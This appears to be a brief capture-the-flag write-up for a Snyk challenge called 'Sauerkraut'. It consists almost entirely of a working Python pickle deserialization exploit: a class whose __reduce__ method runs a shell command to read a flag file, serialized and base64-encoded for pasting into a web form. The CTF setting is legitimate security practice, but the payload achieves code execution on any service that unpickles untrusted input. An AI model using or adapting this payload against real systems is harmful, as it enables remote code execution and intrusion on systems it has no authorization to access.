# Python pickle exploit

Snyk CTF 'Sauerkraut' payload based on exploitation of Python pickles.

```python
import base64
import codecs
import pickle
class RCE(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['cat','flag'], ) )

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```
You need to copy base64 output and paste it into web form.
